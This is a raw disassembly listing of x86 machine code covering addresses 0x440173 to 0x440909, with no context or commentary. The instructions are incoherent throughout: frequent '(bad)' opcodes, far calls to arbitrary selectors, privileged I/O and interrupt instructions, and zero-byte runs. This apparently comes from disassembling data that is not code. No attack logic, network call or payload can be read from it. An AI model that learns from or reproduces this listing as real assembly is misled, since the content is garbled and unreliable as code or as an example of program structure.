  440173:	sub    eax,0x2d07a432
  440178:	fisub  DWORD PTR [ebp-0x5a55d2c9]
  44017e:	(bad)  
  44017f:	sub    al,0x0
  440181:	jb     0x4401d5
  440183:	loop   0x4401b8
  440185:	stos   DWORD PTR es:[edi],eax
  440186:	dec    edx
  440187:	sbb    BYTE PTR [esi+esi*4],dh
  44018a:	push   edx
  44018b:	cmp    eax,0x5452d734
  440190:	xor    al,0x43
  440192:	push   edx
  440193:	xchg   esi,eax
  440194:	xor    al,0xaf
  440196:	push   ecx
  440197:	(bad)  
  440198:	xor    al,0x5f
  44019a:	push   ecx
  44019b:	xchg   BYTE PTR ds:0x35f750da,dh
  4401a1:	mov    BYTE PTR [edi+eax*4+0x36],dl
  4401a5:	loopne 0x4401fb
  4401a7:	fdiv   DWORD PTR [esi]
  4401a9:	ins    BYTE PTR es:[edi],dx
  4401aa:	push   ebp
  4401ab:	dec    edx
  4401ac:	aaa    
  4401ad:	hlt    
  4401ae:	push   ebp
  4401af:	loop   0x4401e8
  4401b1:	add    DWORD PTR [edi-0x6b],0x4149a63a
  4401b8:	cmp    al,0xeb
  4401ba:	dec    edx
  4401bb:	mov    ch,0x3d
  4401bd:	mov    cl,0x4c
  4401bf:	mov    cl,0x3e
  4401c1:	add    cl,BYTE PTR [ebp-0x11]
  4401c4:	ds or  al,0x4e
  4401c7:	out    dx,eax
  4401c8:	aas    
  4401c9:	or     al,0xd6
  4401cb:	clc    
  4401cc:	inc    DWORD PTR [eax]
  4401ce:	add    BYTE PTR [eax],al
  4401d0:	add    BYTE PTR [eax],al
  4401d2:	cwde   
  4401d3:	(bad)  
  4401d4:	(bad)  
  4401d5:	(bad)  
  4401d6:	cmp    ecx,DWORD PTR [edi+0x64]
  4401d9:	xor    DWORD PTR [edx],ebp
  4401db:	push   eax
  4401dc:	call   0xb932:0xee50eb32
  4401e3:	push   eax
  4401e4:	xchg   edi,eax
  4401e5:	xor    ecx,DWORD PTR [edx]
  4401e7:	push   edx
  4401e8:	lods   al,BYTE PTR ds:[esi]
  4401e9:	xor    esi,esi
  4401eb:	push   ecx
  4401ec:	mov    ebx,0xc8519633
  4401f1:	xor    ebp,DWORD PTR [esi]
  4401f3:	push   ecx
  4401f4:	fidiv  WORD PTR [ebx]
  4401f6:	push   0xd633ec51
  4401fb:	dec    ecx
  4401fc:	cmp    BYTE PTR [esi*2-0x7eb0375e],dh
  440203:	mov    cl,0xc8
  440205:	imul   ecx,DWORD PTR [bx+0x6dc8],0x9fc88561
  44020e:	imul   esi,DWORD PTR [edi],0xb561f8d0
  440214:	iret   
  440215:	push   esi
  440216:	dec    eax
  440217:	aam    0xce
  440219:	jns    0x44025b
  44021b:	icebp  
  44021c:	iret   
  44021d:	cwde   
  44021e:	dec    eax
  44021f:	call   0x75cd:0xc040e3cf
  440226:	stos   DWORD PTR es:[edi],eax
  440227:	fmulp  st(6),st
  440229:	scas   eax,DWORD PTR es:[edi]
  44022a:	mov    ds:0xaa16ceb2,eax
  44022f:	or     al,0xcd
  440231:	cmp    BYTE PTR [edx+0xc9cd30],ah
  440237:	add    BYTE PTR [eax],al
  440239:	add    BYTE PTR [eax],al
  44023b:	mov    cl,BYTE PTR [ebp+ecx*8-0x32677d12]
  440242:	outs   dx,DWORD PTR ds:[esi]
  440243:	jge    0x440216
  440245:	(bad)  
  440246:	leave  
  440247:	jge    0x4402a0
  440249:	retf   
  44024a:	or     al,0x6c
  44024c:	fs retf 
  44024e:	sub    ebp,DWORD PTR [ecx+eiz*1-0x35]
  440252:	jb     0x4402b0
  440254:	lods   eax,DWORD PTR ds:[esi]
  440255:	retf   
  440256:	clc    
  440257:	pop    esp
  440258:	push   ecx
  440259:	retf   0x4f48
  44025c:	sti    
  44025d:	retf   0x4fae
  440260:	cmp    cl,bl
  440262:	(bad)  
  440264:	pop    ebx
  440265:	leave  
  440266:	scas   al,BYTE PTR es:[edi]
  440267:	ds xor edx,ecx
  44026a:	in     al,0xae
  44026c:	aaa    
  44026d:	retf   0xaef4
  440270:	push   0xffffffc0
  440272:	or     al,0xa1
  440274:	pop    eax
  440275:	rcr    BYTE PTR [edx],0x99
  440278:	inc    edi
  44027a:	sub    al,0x91
  44027c:	add    bh,BYTE PTR [edi-0x66c9ba39]
  440282:	(bad)  
  440283:	div    DWORD PTR ds:0x35dec75e
  440289:	inc    edi
  44028a:	(bad)  
  44028b:	aam    0x35
  44028d:	push   ecx
  44028e:	(bad)  
  44028f:	jmp    0xa735:0xa8c71535
  440296:	enter  0x36ef,0x34
  44029a:	enter  0x36b4,0xb2
  44029e:	mov    DWORD PTR [eax],0x0
  4402a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4402a5:	ss mov ebx,0xd5368cc7
  4402ab:	mov    DWORD PTR [edx-0x6e3618ca],0xa7ca1338
  4402b5:	cmp    BYTE PTR [ecx],bl
  4402b7:	retf   0x3948
  4402ba:	sbb    cl,cl
  4402bc:	out    0x37,al
  4402be:	push   eax
  4402bf:	leave  
  4402c0:	xor    BYTE PTR [eax],bh
  4402c2:	xchg   esi,eax
  4402c3:	leave  
  4402c4:	dec    ebp
  4402c5:	cmp    bh,ah
  4402c7:	ret    
  4402c8:	inc    edx
  4402c9:	js     0x44033d
  4402cb:	add    al,0x75
  4402cd:	add    ch,bh
  4402cf:	shl    DWORD PTR [edx+0x32],cl
  4402d2:	sbb    eax,0xa3293d4
  4402d7:	aam    0x9f
  4402d9:	xor    cl,BYTE PTR [esi-0x2d]
  4402dc:	cmp    esi,DWORD PTR [edx]
  4402de:	jl     0x4402b3
  4402e0:	ins    BYTE PTR es:[edi],dx
  4402e1:	xor    al,0x14
  4402e3:	(bad)  
  4402e4:	inc    edx
  4402e5:	xor    al,0xa0
  4402e7:	(bad)  
  4402e8:	pop    esp
  4402e9:	xor    esp,DWORD PTR [esp+edx*8-0x2ff1d19b]
  4402f0:	pop    ebx
  4402f1:	cs push ebp
  4402f3:	rol    BYTE PTR [ecx],1
  4402f5:	das    
  4402f6:	jns    0x4402c8
  4402f8:	lods   eax,DWORD PTR ds:[esi]
  4402f9:	add    BYTE PTR cs:[eax*8-0x3c4dcc97],bl
  440301:	div    BYTE PTR [edx]
  440303:	jo     0x4402bf
  440305:	mov    dh,BYTE PTR [edx]
  440307:	jbe    0x440309
  440309:	add    BYTE PTR [eax],al
  44030b:	add    BYTE PTR [eax],al
  44030d:	mov    dl,0x9a
  44030f:	xor    cl,BYTE PTR [esi-0x56]
  440312:	stos   BYTE PTR es:[edi],al
  440313:	xor    dl,BYTE PTR [eax-0x3e]
  440316:	mov    dh,0x32
  440318:	sbb    edi,DWORD PTR [edx-0x4df3cdb2]
  44031e:	jno    0x440352
  440320:	loope  0x4402e6
  440322:	or     BYTE PTR [edx],dh
  440324:	retf   0x1da4
  440327:	xor    bl,BYTE PTR [ecx]
  440329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44032a:	das    
  44032b:	xor    ch,BYTE PTR [ecx]
  44032d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44032e:	mov    edi,0xb5a73a31
  440333:	xor    BYTE PTR [edi+edi*1+0x3b553655],dh
  44033a:	xor    BYTE PTR ds:0x359f3057,0x86
  440341:	sub    BYTE PTR [ebx+0x5a409f35],bh
  440347:	xor    eax,0x35723899
  44034c:	in     al,dx
  44034d:	xor    ebx,ecx
  44034f:	xor    al,0x3b
  440351:	sub    BYTE PTR [esp+esi*1+0x34514162],al
  440358:	add    BYTE PTR ds:0x3a293b9f,bh
  44035e:	int    0x39
  440360:	stos   DWORD PTR es:[edi],eax
  440361:	sub    al,0x4d
  440363:	cmp    DWORD PTR [ebx+0x3c],esi
  440366:	je     0x4403a0
  440368:	jmp    0x8a3c7a33
  44036d:	jbe    0x440371
  44036f:	add    BYTE PTR [esi+0x0],ch
  440375:	add    BYTE PTR [esi],ah
  440377:	push   edi
  440378:	das    
  440379:	or     eax,esi
  44037b:	and    DWORD PTR [edi],ebp
  44037d:	add    BYTE PTR [ebx],bl
  44037f:	push   esp
  440380:	add    al,0x32
  440382:	mov    edi,0xfe321a4c
  440387:	dec    esp
  440388:	xor    DWORD PTR [edx],0x34354e3f
  44038e:	pop    ds
  44038f:	inc    edi
  440390:	inc    esp
  440391:	xor    al,0xfe
  440393:	inc    esi
  440394:	push   edi
  440395:	xor    al,0xf1
  440397:	inc    esi
  440398:	je     0x4403ce
  44039a:	sub    al,BYTE PTR [edi-0x67]
  44039d:	xor    al,0x42
  44039f:	inc    edi
  4403a0:	mov    bh,0x34
  4403a2:	push   esp
  4403a3:	inc    edi
  4403a4:	loopne 0x4403da
  4403a6:	mov    edi,0xdb353947
  4403ab:	inc    edi
  4403ac:	inc    edi
  4403ad:	xor    eax,0x3566514a
  4403b2:	and    edx,DWORD PTR [ecx-0x70]
  4403b5:	xor    eax,0x35aa50f4
  4403ba:	sub    eax,0x4f360454
  4403bf:	dec    eax
  4403c0:	daa    
  4403c1:	ss in  eax,0x44
  4403c4:	nop
  4403c5:	inc    DWORD PTR ss:[edi+edx*8+0x36]
  4403ca:	mov    ebp,0x76376c45
  4403cf:	inc    edi
  4403d0:	xor    al,0x39
  4403d2:	mov    es,WORD PTR [edi+0x5f]
  4403d5:	cmp    edx,edx
  4403d7:	inc    edi
  4403d8:	mov    WORD PTR [ecx],?
  4403da:	add    BYTE PTR [eax],al
  4403dc:	add    BYTE PTR [eax],al
  4403de:	add    BYTE PTR [ebp+0x6839a647],bh
  4403e4:	inc    edi
  4403e5:	cmp    ah,BYTE PTR gs:[edi+0x4e3c3348]
  4403ec:	dec    edx
  4403ed:	jg     0x44042b
  4403ef:	add    cl,BYTE PTR [ebx+0x14]
  4403f2:	cmp    eax,0x3d394b7a
  4403f7:	push   ds
  4403f8:	dec    ebx
  4403f9:	jb     0x440438
  4403fb:	jne    0x4403e6
  4403fd:	mov    BYTE PTR [ebp-0x6a390650],0xa8
  440404:	mov    esi,eax
  440406:	mov    cs:0x9a28c26c,eax
  44040c:	jbe    0x4403cf
  44040e:	inc    ebp
  44040f:	xchg   edx,eax
  440410:	cmp    eax,ecx
  440412:	dec    edx
  440414:	imul   ebx,DWORD PTR [edi+edi*8+0x3e3c2],0x75
  44041c:	push   edx
  44041d:	int3   
  44041e:	cmp    BYTE PTR [ebp-0x45],ah
  440421:	int3   
  440422:	pop    edi
  440423:	gs test esp,0xd3dd6575
  44042a:	ret    0x4f65
  44042d:	rcr    DWORD PTR [esp+eax*2],cl
  440430:	repz sar DWORD PTR [edi+eax*2],cl
  440434:	(bad)  
  440435:	int    0x6a
  440437:	inc    edi
  440438:	(bad)
  44043b:	inc    ecx
  44043c:	in     al,0xc8
  44043e:	mov    DWORD PTR [ecx+0xc0c8aa],ebp
  440444:	add    BYTE PTR [eax],al
  440446:	add    BYTE PTR [eax],al
  440448:	mov    eax,ds:0xa9f4c8a0
  44044d:	iretw  
  44044f:	adc    al,0xa0
  440451:	add    ecx,edi
  440453:	cmp    al,0x88
  440455:	sbb    ecx,edi
  440457:	jno    0x4403d9
  440459:	jl     0x44042a
  44045b:	ret    
  44045c:	mov    BYTE PTR [esi-0x527f2c31],ah
  440462:	iret   
  440463:	loopne 0x4404cd
  440465:	xchg   edx,eax
  440466:	iret   
  440467:	add    eax,0x68ca2763
  44046c:	imul   ebx,DWORD PTR [edi],0xffffffc9
  44046f:	imul   esp,DWORD PTR [edx-0x38],0xffffffc9
  440473:	les    ecx,FWORD PTR [edx-0x8]
  440476:	leave  
  440477:	mov    cs,WORD PTR [ebp+0x2]
  44047a:	cmc    
  44047b:	int3   
  44047c:	sahf   
  44047d:	cmp    ebp,DWORD PTR [esp+ecx*8-0x2a]
  440481:	cmp    dl,BYTE PTR [esi-0x77c78834]
  440487:	leave  
  440488:	ret    0x5437
  44048b:	leave  
  44048c:	(bad)  
  44048d:	cmp    edx,ecx
  44048f:	retf   0x3673
  440492:	rol    edi,cl
  440494:	mov    ?,WORD PTR [esi]
  440496:	xchg   esp,eax
  440497:	(bad)  
  440498:	lock xor eax,0x371cc8bf
  44049e:	outs   dx,BYTE PTR ds:[esi]
  44049f:	enter  0x36e6,0x24
  4404a3:	enter  0x347e,0x84
  4404a7:	lds    ebx,FWORD PTR [edi]
  4404a9:	xor    al,0x80
  4404ab:	lds    eax,FWORD PTR [eax]
  4404ad:	add    BYTE PTR [eax],al
  4404af:	add    BYTE PTR [eax],al
  4404b1:	clc    
  4404b2:	xor    ebp,ecx
  4404b4:	mov    BYTE PTR [edx+0x5bc6d135],0x35
  4404bb:	lods   eax,DWORD PTR ds:[esi]
  4404bc:	(bad)  
  4404bd:	dec    edx
  4404be:	xor    eax,0x352cc52f
  4404c3:	inc    edi
  4404c4:	lds    edx,FWORD PTR [ecx]
  4404c6:	xor    eax,0x33f0c553
  4404cb:	pop    ebp
  4404cc:	(bad)  
  4404cf:	test   ebp,eax
  4404d1:	sbb    eax,0x51c59c34
  4404d6:	xor    al,0xe7
  4404d8:	xchg   ebx,eax
  4404d9:	push   edx
  4404da:	je     0x440556
  4404dc:	add    al,0x75
  4404de:	add    dh,cl
  4404e0:	shl    DWORD PTR [edx+0x32],cl
  4404e3:	rcl    bl,1
  4404e5:	xchg   BYTE PTR [edx],dh
  4404e7:	dec    esp
  4404e8:	aam    0x28
  4404ea:	xor    ebp,ebp
  4404ec:	shr    BYTE PTR [esi+0x31],cl
  4404ef:	inc    esi
  4404f0:	shr    ebp,cl
  4404f2:	xor    BYTE PTR [edi-0x30],bl
  4404f5:	int    0x2e
  4404f7:	add    BYTE PTR [ecx+0x3c332025],cl
  4404fd:	cmp    bh,BYTE PTR [eax+0x32]
  440500:	or     eax,0x7b31be33
  440505:	sub    edx,DWORD PTR [ebx+0x31]
  440508:	out    0xc1,eax
  44050a:	shl    DWORD PTR [eax],1
  44050c:	es mov eax,0xb18737a9
  440512:	aas    
  440513:	aaa    
  440514:	cmp    eax,DWORD PTR [eax]
  440516:	add    BYTE PTR [eax],al
  440518:	add    BYTE PTR [eax],al
  44051a:	test   eax,0xbff33703
  44051f:	fdiv   DWORD PTR [esi]
  440521:	lds    edi,FWORD PTR [edi-0x51a4c97e]
  440527:	cmp    esi,DWORD PTR [esi]
  440529:	pop    es
  44052a:	scas   al,BYTE PTR es:[edi]
  44052b:	jb     0x440563
  44052d:	hlt    
  44052e:	mov    esp,0xbf6c35c0
  440533:	ins    BYTE PTR es:[edi],dx
  440534:	xor    eax,0x350faf06
  440539:	enter  0x31ad,0x35
  44053d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44053e:	mov    ebp,0xbd7a34d6
  440543:	jge    0x440579
  440545:	mov    DWORD PTR [ebp-0x5241cb55],ebp
  44054b:	js     0x440581
  44054d:	hlt    
  44054e:	cmp    dh,BYTE PTR [ecx]
  440550:	cmp    al,0xe7
  440552:	xor    ecx,DWORD PTR [eax]
  440554:	cmp    ecx,DWORD PTR [edi]
  440556:	cmp    cl,dh
  440558:	cmp    dl,BYTE PTR [ebx+0x32]
  44055b:	jnp    0x440597
  44055d:	cwde   
  44055e:	cmp    ecx,DWORD PTR [edx+edi*1+0x44]
  440562:	xor    ebp,esi
  440564:	cmp    DWORD PTR [edx+0x38],edi
  440567:	xchg   esi,eax
  440568:	cmp    DWORD PTR [edx+0x30],ebx
  44056b:	cmp    al,0x39
  44056d:	mov    ah,0x38
  44056f:	push   0x14308c39
  440574:	cmp    DWORD PTR [eax],eax
  440576:	aaa    
  440577:	ds push esp
  440579:	aas    
  44057a:	and    BYTE PTR [esi],bh
  44057c:	test   DWORD PTR [edi],edi
  44057e:	add    BYTE PTR [eax],al
  440580:	add    BYTE PTR [eax],al
  440582:	add    BYTE PTR [ecx-0x17c041c2],bh
  440588:	cmp    eax,0x3eb43fca
  44058d:	out    0x3f,eax
  44058f:	or     al,0xff
  440591:	clc    
  440592:	call   FWORD PTR [eax-0x1]
  440595:	(bad)  
  440596:	(bad)  
  440597:	fimul  DWORD PTR [esi+0x27]
  44059a:	xor    BYTE PTR [ebp+0x4e],dh
  44059d:	dec    ecx
  44059e:	xor    BYTE PTR [esi],dl
  4405a0:	dec    edi
  4405a1:	push   0x984f2e30
  4405a6:	xor    BYTE PTR [edx+0x4f],al
  4405a9:	shl    BYTE PTR [eax],1
  4405ab:	jb     0x4405fc
  4405ad:	hlt    
  4405ae:	xor    BYTE PTR [edx-0x21cedbb1],bh
  4405b4:	dec    edi
  4405b5:	pop    esp
  4405b6:	xor    DWORD PTR [esi],ecx
  4405b8:	push   eax
  4405b9:	xor    BYTE PTR [ecx],0x49
  4405bc:	push   eax
  4405bd:	mov    bl,0x31
  4405bf:	jge    0x440611
  4405c1:	out    dx,al
  4405c2:	xor    DWORD PTR [eax-0x27cdedb0],esp
  4405c8:	push   eax
  4405c9:	inc    edx
  4405ca:	xor    ch,BYTE PTR [esp+ebp*1]
  4405cd:	jp     0x440601
  4405cf:	cld    
  4405d0:	sub    ebx,DWORD PTR [esi-0x2ec6e8ce]
  4405d6:	xor    ch,BYTE PTR [ebx]
  4405d8:	cmp    DWORD PTR [ebx+esi*1],edx
  4405db:	pop    ebx
  4405dc:	cmp    DWORD PTR [esi],ebx
  4405de:	xor    ebp,DWORD PTR [ecx+0x39]
  4405e1:	xor    al,0x33
  4405e3:	inc    edi
  4405e4:	cmp    DWORD PTR [edx],edi
  4405e6:	xor    eax,DWORD PTR [eax]
  4405e8:	add    BYTE PTR [eax],al
  4405ea:	add    BYTE PTR [eax],al
  4405ec:	xchg   ebp,eax
  4405ed:	cmp    DWORD PTR [ebx+esi*1+0x6d],edx
  4405f1:	cmp    DWORD PTR [ebp-0x1dc655cd],edx
  4405f7:	xor    esi,DWORD PTR [ebp-0x6c]
  4405fa:	xor    BYTE PTR [ecx+eiz*2],bh
  4405fd:	push   cs
  4405fe:	cmp    BYTE PTR [edx-0xc86b97],cl
  440604:	popa   
  440605:	ja     0x44063c
  440607:	cmc    
  440608:	dec    ebp
  440609:	pop    esi
  44060a:	cmp    edx,DWORD PTR [edi]
  44060c:	dec    esp
  44060d:	push   es
  44060e:	cmp    ecx,DWORD PTR [ecx+0x6e3ad53c]
  440614:	ds jmp 0x44064f
  440617:	mov    esp,0x603f17ae
  44061c:	stos   BYTE PTR es:[edi],al
  44061d:	and    bh,BYTE PTR ds:0xc5ba2fa
  440623:	(bad)  
  440624:	(bad)  
  440626:	add    eax,DWORD PTR [eax]
  440628:	jne    0x4405e7
  44062a:	xor    bh,ch
  44062c:	xchg   BYTE PTR [edx+0x30],dh
  44062f:	inc    esi
  440630:	mov    DWORD PTR [eax+esi*1+0x37f78179],edx
  440637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440638:	imul   edx,DWORD PTR [edi],0x88603038
  44063e:	aaa    
  44063f:	ins    DWORD PTR es:[edi],dx
  440640:	push   0x60983789
  440645:	enter  0xd036,0x48
  440649:	mov    dl,0x36
  44064b:	ins    DWORD PTR es:[edi],dx
  44064c:	inc    ebx
  44064d:	shl    BYTE PTR ds:0xcd,cl
  440653:	add    BYTE PTR [eax],al
  440655:	dec    ebx
  440656:	es xor eax,0x35454274
  44065c:	cli    
  44065d:	stos   BYTE PTR es:[edi],al
  44065e:	lds    edi,FWORD PTR [ebx]
  440660:	inc    eax
  440661:	lods   al,BYTE PTR ds:[esi]
  440662:	push   ds
  440663:	cmp    edx,DWORD PTR [edi+0x4d3aaf9f]
  440669:	sahf   
  44066a:	sar    DWORD PTR [ecx],1
  44066c:	mov    bl,0x8e
  44066e:	(bad)  
  44066f:	cmp    edi,esp
  440671:	mov    ?,WORD PTR [ecx+0x2810139]
  440677:	fidivr WORD PTR [edi]
  440679:	popf   
  44067a:	cs dec eax
  44067c:	aas    
  44067d:	(bad)  ds:0x2de33f41
  440683:	call   0xc240:0xe62e213f
  44068a:	das    
  44068b:	push   esp
  44068c:	inc    eax
  44068d:	rep movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  440690:	inc    eax
  440691:	aas    
  440692:	das    
  440693:	call   0x187453d9
  440698:	inc    edx
  440699:	mov    ch,0x30
  44069b:	xchg   BYTE PTR [ecx+0x23],al
  44069e:	xor    BYTE PTR [edi],bl
  4406a0:	inc    ecx
  4406a1:	loopne 0x4406d2
  4406a3:	loop   0x4406e7
  4406a5:	jno    0x4406d8
  4406a7:	fadd   DWORD PTR [edx-0x27]
  4406aa:	xor    bh,ah
  4406ac:	and    edx,edx
  4406ae:	jo     0x440652
  4406b0:	add    esi,DWORD PTR [ebp+0x2]
  4406b3:	lods   al,BYTE PTR ds:[esi]
  4406b4:	xor    al,0xe1
  4406b6:	xor    esi,DWORD PTR [esi+esi*1+0x0]
  4406ba:	add    BYTE PTR [eax],al
  4406bc:	add    BYTE PTR [eax],al
  4406be:	adc    BYTE PTR ds:0x36d0365d,dh
  4406c4:	sub    eax,0x4d398e39
  4406c9:	cmp    bh,BYTE PTR [ecx-0x53c5cfc8]
  4406cf:	cmp    al,ah
  4406d1:	cmp    ebp,DWORD PTR [edx+ebp*1+0x36]
  4406d5:	cmp    al,0x6a
  4406d7:	sub    al,0x72
  4406d9:	cmp    eax,0x3ec92bd8
  4406de:	mov    eax,ds:0x1c3dcc2c
  4406e3:	das    
  4406e4:	cdq    
  4406e5:	inc    eax
  4406e6:	sub    DWORD PTR [edi],ebp
  4406e8:	mov    ds:0xc42f3c40,al
  4406ed:	inc    eax
  4406ee:	jb     0x44071d
  4406f0:	idiv   BYTE PTR [esi]
  4406f2:	ret    0x2d
  4406f5:	push   0x443a938a
  4406fa:	mov    ah,0xae
  4406fc:	cmp    cl,ch
  4406fe:	xchg   BYTE PTR [edi-0x8],ch
  440701:	ins    DWORD PTR es:[edi],dx
  440702:	jns    0x440706
  440704:	add    dl,bl
  440706:	data16 xor BYTE PTR [eax],dh
  440709:	xor    BYTE PTR [ecx-0x3c],ch
  44070c:	cs popa 
  44070e:	data16 fwait
  440710:	cs cdq 
  440712:	inc    esi
  440713:	sub    ch,BYTE PTR [esi]
  440715:	inc    eax
  440716:	inc    eax
  440717:	cdq    
  440718:	sub    al,0x80
  44071a:	dec    eax
  44071b:	jb     0x440749
  44071d:	call   0xee780864
  440722:	add    BYTE PTR [eax],al
  440724:	add    BYTE PTR [eax],al
  440726:	add    BYTE PTR [edx-0x52f9cbe8],ch
  44072c:	xor    esi,DWORD PTR [eax+eax*1]
  44072f:	stos   BYTE PTR es:[edi],al
  440730:	shl    DWORD PTR [edx],cl
  440732:	(bad)  
  440733:	mov    ds:0x8a6132f4,eax
  440738:	mov    eax,ds:0xf9822732
  44073d:	xor    DWORD PTR [eax],eax
  44073f:	jg     0x440700
  440741:	xor    DWORD PTR [esi-0x5dce2084],ecx
  440747:	ins    BYTE PTR es:[edi],dx
  440748:	sti    
  440749:	xor    BYTE PTR [eax+0x7330806d],bl
  44074f:	pop    esp
  440750:	std    
  440751:	aaa    
  440752:	sbb    al,0x59
  440754:	or     eax,0x54509236
  440759:	xor    eax,0x34a2498f
  44075e:	mov    DWORD PTR [edx-0x16],0x583a923b
  440765:	cmp    edi,ecx
  440767:	mov    bl,0x29
  440769:	cmp    esi,DWORD PTR [ebp+0x7c3a11ab]
  44076f:	mov    ah,0x50
  440771:	cmp    DWORD PTR [eax],eax
  440773:	xor    al,0xc1
  440775:	cmp    bh,BYTE PTR [edi]
  440777:	outs   dx,DWORD PTR ds:[esi]
  440778:	sar    DWORD PTR [ebx+0x3f],0xd9
  44077c:	ret    0x3f8b
  44077f:	sahf   
  440780:	ret    0x3fa3
  440783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440784:	ret    0x3faa
  440787:	xchg   ebp,eax
  440788:	ret    0x3fcb
  44078b:	add    BYTE PTR [eax],al
  44078d:	add    BYTE PTR [eax],al
  44078f:	add    dl,ah
  440791:	sar    edi,0xff
  440794:	or     al,0x43
  440796:	stc    
  440797:	dec    DWORD PTR [eax+0x32000003]
  44079d:	xor    ecx,DWORD PTR [esi+0x30]
  4407a0:	jbe    0x4407d8
  4407a2:	ja     0x4407d4
  4407a4:	xor    BYTE PTR [ebx],0xed
  4407a7:	xor    BYTE PTR [edx+0x34],bh
  4407aa:	scas   al,BYTE PTR es:[edi]
  4407ab:	xor    DWORD PTR [esp+esi*1+0x60],edx
  4407af:	xor    al,0x57
  4407b1:	aaa    
  4407b2:	cwde   
  4407b3:	xor    al,0x81
  4407b5:	aaa    
  4407b6:	sysexit 
  4407b8:	pop    ecx
  4407b9:	cmp    bh,dl
  4407bb:	xor    eax,0x37c028a8
  4407c0:	addr16 sub bh,dl
  4407c3:	aaa    
  4407c4:	push   ecx
  4407c5:	sub    eax,DWORD PTR [edx-0x37d34bc7]
  4407cb:	cmp    ch,BYTE PTR [ebx+0x2d]
  4407ce:	call   0x3671960d
  4407d3:	cmp    ebx,DWORD PTR [ecx]
  4407d5:	cs cwde 
  4407d7:	cmp    ebp,DWORD PTR [esi]
  4407d9:	cs jp  0x440818
  4407dc:	sbb    eax,0x3a3d9730
  4407e1:	xor    BYTE PTR [ebp-0x4ccfc0c3],ah
  4407e7:	cmp    eax,0x3dbdc0ce
  4407ec:	and    ah,al
  4407ee:	leave  
  4407ef:	cmp    eax,0xf03eb175
  4407f4:	add    BYTE PTR [eax],al
  4407f6:	add    BYTE PTR [eax],al
  4407f8:	add    BYTE PTR [eax-0x64d2c591],ah
  4407fe:	add    DWORD PTR [edx],edi
  440800:	inc    eax
  440801:	xchg   ebx,eax
  440802:	xor    edi,DWORD PTR [edx]
  440804:	dec    ecx
  440805:	mov    ecx,DWORD PTR [eax]
  440807:	cmp    dl,BYTE PTR [edi-0x7d]
  44080a:	cld    
  44080b:	cmp    DWORD PTR [ecx+0x7b],esp
  44080e:	fstp   TBYTE PTR [ecx]
  440810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440811:	jae    0x4407ab
  440813:	cmp    esp,esp
  440815:	imul   eax,DWORD PTR [eax-0x379df5c7],0x38
  44081c:	rcr    DWORD PTR [edx+0x5b],cl
  44081f:	int3   
  440820:	(bad)  
  440821:	adc    al,al
  440823:	add    eax,DWORD PTR [eax]
  440825:	jne    0x4407e0
  440827:	xor    esp,DWORD PTR [edx]
  440829:	inc    edi
  44082a:	ucomiss xmm1,DWORD PTR [ebx-0xbd277b9]
  440831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440832:	add    al,0x2d
  440834:	sub    eax,0x6c2db4a6
  440839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44083a:	jmp    0x440868
  44083c:	cdq    
  44083d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44083e:	jle    0x44086c
  440840:	mov    al,0x86
  440842:	sbb    ch,BYTE PTR ds:0x2d3786e9
  440848:	daa    
  440849:	mov    DWORD PTR [esi+0x30],esi
  44084c:	pop    ebx
  44084d:	adc    DWORD PTR [edx-0x26968bd0],0xff61db37
  440857:	aaa    
  440858:	repnz imul esp,DWORD PTR [edx+0x37],0xe
  440860:	add    BYTE PTR [eax],al
  440862:	pusha  
  440863:	mov    cl,0x37
  440865:	push   eax
  440866:	dec    eax
  440867:	mov    al,ds:0x84406637
  44086c:	aaa    
  44086d:	jnp    0x4408b7
  44086f:	loop   0x4408a7
  440871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440872:	inc    eax
  440873:	add    bl,BYTE PTR [ecx-0x5ac8cec8]
  440879:	cmp    BYTE PTR [edi],bh
  44087b:	aaa    
  44087c:	mov    esp,0xd5375738
  440881:	cmp    BYTE PTR [edx+0x34],dh
  440884:	adc    al,0x36
  440886:	lea    esi,[edi+eiz*1]
  440889:	ss mov ah,0x34
  44088c:	and    al,0x36
  44088e:	mov    al,ds:0x2b359d34
  440893:	xor    al,0xbd
  440895:	xor    eax,0x358d3415
  44089a:	sbb    dh,BYTE PTR [esp+edx*4]
  44089d:	xor    eax,0x36b23558
  4408a2:	mov    DWORD PTR [eax],ebp
  4408a4:	jb     0x4408df
  4408a6:	sbb    BYTE PTR [eax],ch
  4408a8:	jl     0x4408e3
  4408aa:	jns    0x4408da
  4408ac:	aad    0x3f
  4408ae:	pop    eax
  4408af:	cs stos BYTE PTR es:[edi],al
  4408b1:	aas    
  4408b2:	xchg   ecx,eax
  4408b3:	fidivr WORD PTR cs:[edi]
  4408b6:	imul   BYTE PTR ds:0x2ddc3f4f
  4408bc:	loopne 0x4408fe
  4408be:	xor    ch,BYTE PTR [edi]
  4408c0:	stos   DWORD PTR es:[edi],eax
  4408c1:	inc    eax
  4408c2:	clc    
  4408c3:	mov    eax,cs:0x3d
  4408c9:	add    BYTE PTR [eax],al
  4408cb:	jge    0x4408fa
  4408cd:	jmp    0xa4718f10
  4408d2:	shr    DWORD PTR ds:[edi+eiz*8],cl
  4408d6:	jecxz  0x440893
  4408d8:	ins    BYTE PTR es:[edi],dx
  4408d9:	and    al,BYTE PTR [ebx]
  4408db:	jne    0x4408df
  4408dd:	cmc    
  4408de:	xor    al,0x1c
  4408e0:	xor    ecx,DWORD PTR [eax+0x34]
  4408e3:	fwait
  4408e4:	xor    bl,BYTE PTR [eax]
  4408e6:	xor    al,0x82
  4408e8:	xor    cl,dl
  4408ea:	xor    DWORD PTR [ecx+0x30],edx
  4408ed:	mov    eax,ds:0x302531
  4408f2:	nop
  4408f3:	inc    esp
  4408f4:	loopne 0x440923
  4408f6:	jp     0x44093c
  4408f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4408f9:	sub    eax,0x2d45a792
  4408fe:	shl    DWORD PTR [edi-0x5a1fd298],1
  440904:	mov    esi,0x8da45b2c
  440909:	sub    al,0xb0
